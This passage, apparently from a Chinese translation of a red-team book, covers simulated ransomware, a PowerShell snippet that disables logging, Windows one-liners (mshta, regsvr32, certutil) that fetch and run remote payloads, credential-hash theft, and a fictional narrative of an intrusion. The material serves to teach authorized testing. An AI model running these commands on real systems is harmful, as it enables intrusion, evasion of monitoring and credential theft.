那么下一步我们做什么？已经有很多对于不同的密码生成工具、密码分析和其他技术的很好
的研究，目的是找到更快的破解密码的方法。若你有兴趣，这里给出一些资料：
PassGAN：使用深度学习方法进行密码破解
快速、精益、准确:使用神经网络建模的密码可猜测性
232
第8章 特勤组——破解、漏洞利用和技巧
具有创新性的的入侵行动
作为公司的内部红队可以有机会参加具有创新性的的入侵行动。我最喜欢的行动之一是模拟
勒索软件。在过去，我们被允许在 WannaCry 大面积爆发的时期进行模拟勒索软件行动。随
着加密软件和勒索软件越来越受欢迎，我们确实需要有能力测试我们的业务恢复和遇难恢复
程序。我们在现实生活中见证了这一点，WannaCry 通过 SMB 进行横向移动，利用
EternalBlue ，加密文件等攻击，甚至删除了主机系统上的所有备份。作为一个 IT 组织，我们
需要问自己的问题是，如果我们的某个用户点击了该恶意软件，会产生什么影响？我们可以
恢复用户文件、共享文件、数据库等东西吗？我们一直听到的答案是，“我觉得可以......”，但
如果没有红队提前验证的过程，我们最终会等到我们的房子被烧成灰后才知道是不是真的可
以。
这就是为什么我喜欢公司内部进行红队评估的原因。我们可以在受控环境中真正证明并验证
安全性和 IT 是否正常运行。对于这本书，我没有列举任何我们的勒索软件的例子，因为这样
做很危险。我将让你负责构建工具并以批准的方法测试你的客户。
模拟勒索软件行动提示：
有些公司实际上不会让入侵者删除或加密文件。对于这些公司，你可以进行模拟勒索软
件攻击。一旦恶意软件被执行，它所做的就是扫描主机和网络中的重要文件，将每个文
件读入内存，执行随机字节交换，将这些字节发送到 C2 服务器，并包含元数据。这将展
示出你能够操作的文件数量，在检测到流量之前可以从网络中渗透出的数据量以及可以
恢复的文件数量。
查看其他勒索软件样本以查看他们正在加密的文件类型。这可以创造一个更接近现实的
行动。例如，查看 WannaCry 中的文件类型（ https://gist.github.com/rain-
1/989428fa5504f378b993ee6efbc0b168 ）。
如果你要 “加密” 恶意软件，请使用简单的方法。它可以是带有密钥的标准 AES，一个公
共或私有的 x509 证书，或某种按位异或。制作它越复杂，无法恢复文件的可能性就越
大。
测试、测试和测试。你可以预见的最糟糕的事情是让目标公司无法恢复关键文件，并且
你的解密过程还不起作用。
许多下一代杀毒软件基于链中的某些动作会自动阻止勒索软件。例如，勒索软件可能执
行的正常检测是：扫描系统中所有类型为 X 的文件，加密 X 文件，删除磁盘中的副本以
及禁用备份。想要绕过检测过程的话，要么减慢勒索软件的活动流程，要么通过不同的
流程达到相同的目的。
禁用 PowerShell 记录
作为红队队员，我们一直在寻找独特的方法来尝试和禁用任何类型的日志记录。虽然现在也
有办法执行这些攻击，但我们仍在不断寻找新的更简单的技术。
233
第8章 特勤组——破解、漏洞利用和技巧
以下是一个 leechristensen 写的示例，可用于禁用 PowerShell 日志记录：
$EtwProvider =
[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
.GetField('etwProvider','NonPublic,Static');
$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -
ArgumentList @([Guid]::NewGuid());
$EtwProvider.SetValue($null, $EventProvider);
从命令行连接网络下载 Windows 文件
如果你通过应用程序漏洞获得了命令执行，又或者是通过 Office 或 PDF 文件获取了 shell，
那么接下来的步骤可能是下载并执行你的辅助恶意软件。
对于这些情况，我们可以利用 Windows 的一些特性来完成任务。大多数这些例子来自
arno0x0x 和 @subtee 的卓越的研究成果（
https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-
payload-and-execute-arbitrary-code ）。
mshta vbscript:Close(Execute(“GetObject(““script: http://webserver/payload.sct ””)”))
mshta http://webserver/payload.hta
rundll32.exe
javascript:"..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payloa
d.sct");window.close();
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
certutil -urlcache -split -f http://webserver/payload payload
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode
payload.b64 payload.dll &
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile=
/LogToConsole=false /u payload.dll
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode
payload.b64 payload.exe & payload.exe
这些只是其中几个例子，还有更多通过命令行来执行辅助代码的方法。你还可以继续研究，
看看是否还有其他技术可以用来从传统的日志记录中隐匿行踪。
从本地管理员权限到系统权限
从本地管理员帐户权限提升到 System 权限可以通过多种方式完成。当然，最常见的方法是使
用 Metasploit 的 getsystem ，但这并不总是可行的。decoder-it 创建了一个非常棒的
PowerShell 脚本，通过创建一个新进程并将该新进程的父进程 PID 设置为 System 所拥有，
234
第8章 特勤组——破解、漏洞利用和技巧
从而让本地管理员权限的 PowerShell 提示符转到 System 权限。可以在此处找到此
PowerShell 脚本。
执行以下操作：
PS> . .\psgetsys.ps1
PS>[MyProcess]::CreateProcessFromParent(, )
在不触及 LSASS 的情况下检索 NTLM 哈希值
Elad Shamir 对怎样在不对 lsass.exe 进程进行操作的情况下抓取 NTLM 哈希进行了广泛的研
究。在这种攻击之前，通过 Mimikatz 操作 LSASS 抓取哈希值的操作受到 Windows 10企业
版和 Windows Server 2016中的凭证保护的限制。Elad 开发了一种称为 Internal Monologue
的攻击，它执行以下操作：
Attack
如上所述，通过将 、 和
LMCompatibilityLevel NTLMMinClientSec
RestrictSendingNTLMTraffic 更改为适当的值来禁用 NetNTLMv1 的预防性控制。
从当前正在运行的进程中检索所有非网络登录令牌并模拟关联的用户。
对于每个模拟用户，获得正在运行的用户 token，模拟用户同 NTLM SSP 进行交互，控
制 Challenge 为固定值，导出返回的 Net-NTLMv1 响应。
恢复 、 和 的原始
LMCompatibilityLevel NTLMMinClientSec RestrictSendingNTLMTraffic
值。
[https://github.com/eladshamir/Internal-Monologue]
译者注 参考资料：Windows 下的密码 hash——Net-NTLMv1 介绍
使用防御工具构建训练和监控的实验环境
235
第8章 特勤组——破解、漏洞利用和技巧
测试我们的恶意软件的一个很大挑战是我们需要建立一个快速测试的环境。Chris Long 构建
的一个名为 Detection Lab 的强大工具是 Packer 和 Vagrant 脚本的合集，可让你快速将
Windows Active Directory 部署上线。该工具包含一系列端点安全和日志记录的最佳实践工
具。 由四个主机组成（https://medium.com/@clong/introducing-detection-
Detection Lab
lab-61db34bed6ae ）：
DC：一个 Windows 2016域控制器
WEF：管理 Windows 事件集合（Windows Event Collection）的 Windows 2016服务器
Win10：模拟非服务器端点的 Windows 10主机
Logger：运行 Splunk 和一个 Fleet 服务器的 Ubuntu 16.04主机
本章总结
对于红队来说，窍门和技巧是我们入侵艺术的一部分。我们必须不断研究攻击用户、攻陷系
统和逃避检测的更好方法。这可没有捷径，需要数小时到数年的练习、汗水和眼泪。
236
第9章 两分钟的训练——从零到英雄
第9章 两分钟的训练——从零到英雄
译者：@Snowming
校对者：@匿名jack
随着时间的推移，直到测试的最后一天你都还没有从目标外部网络取得比较好的突破。因为
你需要进入目标内网，了解他们公司的网络布局，获得一些敏感文件或者代码，然后找到更
多的网段和高权限用户，最终需要拿到 Cyber Space Kittens 公司太空计划的相关资料，此时
你感觉压力很大。你的任务是窃取最新的太空计划相关的绝密信息并且不能失败...现在是两分
钟操练的时候了。只剩一点点时间了，你需要从10码线开始运球，突破所有的防守保护，扫
清路上的障碍，最终把球带到90码线安全着陆。
10码线
你重新翻阅自己之前做的笔记，找出自己可能遗漏的一些信息。你的眼睛聚焦在一个网页屏
幕截图...这是一个 CSK（Cyber Space Kittens）的论坛网站。你暂时没法找到这个网站程序
的漏洞，但是你注意到这个 CSK 论坛网站是给 CSK 内部员工和普通用户共同使用的，用于
发布他们太空项目相关的问题、评论和其他事情。
你在网站上收集那些看上去是属于公司员工的账户。然后你根据账户名提炼信息制作比较靠
谱的密码表（可能使用的密码）。你使用常用密码及其变体对所有这些账户进行密码爆破尝
试。你看到你的 python 脚本正在缓慢的输出… 失败 … 失败 … 失败 … 密码已找到 ！ 当你
看到一个名为 Chris Catfield 的用户使用了 Summer2018! 这个密码时会心一笑。这个比你预
想的要简单的多。接下来，你使用 Chris 的凭证登录论坛，查阅他的私信和帖子，找出那些能
帮助更好的开展下一步行动的信息。你发现 Chris 经常与论坛上的另一位内部员工 Neil
237
第9章 两分钟的训练——从零到英雄
Pawstrong 谈论太空项目。看起来他们不是现实中的朋友，但他们有很融洽的协同工作关
系。这对你开展受信任的钓鱼攻击非常有利。这两个用户之间已经建立了融洽的关系，所以
如果你使用 Chris 的帐号发钓鱼邮件给 Neil，成功的可能性将会很大。
20码线
你在纠结要不要直接向 Neil 发送恶意的 payload，但是那样太明显了。于是你向他发送了一
个你刚搭建好的一个带有猫猫照片的网站的链接，“嘿，Neil，我知道你喜欢猫！看看我做的
这个页面吧！”
几分钟之后，你在论坛网站上收到的 Neil 的回复：“哈哈，我喜欢这个太空猫啦！”Neil 没有
意识到他访问的网页有一个定制的 JavaScript 的 payload，这段 JS 代码在他的机器后台运
行，扫描机器所在的 CSK 内部网络，并且危及未经身份验证的 Jenkins 和 Tomcat Web 服务
器。几秒钟之后，你得到了一个弹回来的 Empire 的 shell，你终于松了一口气。
30码线
当你顺利撕开目标的一道口子，你意识到 CSK 的网络防御部门重新设置防火墙配置、DNS
配置和进行主机屏蔽只是时间问题，所以你需要快速移动。幸运的是，你已经配置了一些自
动化的程序和脚本来处理那些繁琐的工作。受感染的主机已经激活 beacon 并且开始运行
Bloodhound 等工具，查找本地存储的密码相关文件，设置注册表的值来使 Mimikatz 工具能
够捕获 LSASS 进程存储的密码，运行 SPN（Kerberos 服务主体名称）并转储所有 Kerberos
票证，当然还可以在计划任务中做一些持久化渗透的设置。
40码线
238
第9章 两分钟的训练——从零到英雄
你清楚自己需要快速离开这个第一台主机。于是你将所有拿回的 Kerberos ticket（票据）导
入到 Hashcat 程序中，然后开始破解。你发现用那些额外的 BUG 赏金购买了几块1080Ti显
卡是个非常正确的决定。当 hash 开始破解的时候，你注意到有一些服务账户的密码已经破解
完毕，但是你现在还没时间去处理这些。你仔细阅读 Bloodhound 的输出结果，发现这台受害
的机器是属于 Neil Pawstrong 的，并且 Neil 的 AD 账户（域账户）可以访问另一个属于
Buzz Clawdrin 的机器。通过使用 WMI 进行连接，你远程生成一个新的 payload 到 Buzz 的
机器中，然后注入到属于 Buzz 账户进程中。
50码线
幸运的是，你的账户（Neil 的域账户）在 Buzz 主机的本地管理员成员组中，这意味着你能在